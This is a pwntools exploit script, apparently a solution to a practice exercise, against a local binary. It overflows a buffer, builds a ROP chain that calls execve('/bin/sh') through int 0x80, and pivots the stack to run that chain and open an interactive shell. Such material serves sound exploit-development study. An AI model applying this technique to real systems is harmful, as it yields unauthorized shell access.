from pwn import *

context.log_level = 'CRITICAL'
p = process("./prac")
elf = p.elf

gadget = lambda x: p32(next(elf.search(asm(x, arch=elf.arch))))

payload = b'B' * 28

# Set eax to 0xb
payload += gadget("xor eax, eax; ret")
payload += gadget("inc eax; ret") * constants.SYS_execve

# Set ebx to /bin/sh
payload += gadget("pop ebx; ret") + p32(next(elf.search(b"/bin/sh")))

# set ECX and EDX to NULL
payload += gadget("pop ecx; pop edx; ret") + p32(0) * 2

# Call INT 0x80
payload += gadget("int 0x80")

# Send the actual rop chain
p.sendlineafter(b'name...', payload)

# Now to invoke our rop chain, we will overflow and jump
# to our stack pivot
pivot = b'A' * 16 + gadget('add esp, 0xc; pop ebx; pop esi')

p.sendlineafter(b'age\n', pivot)
p.interactive()
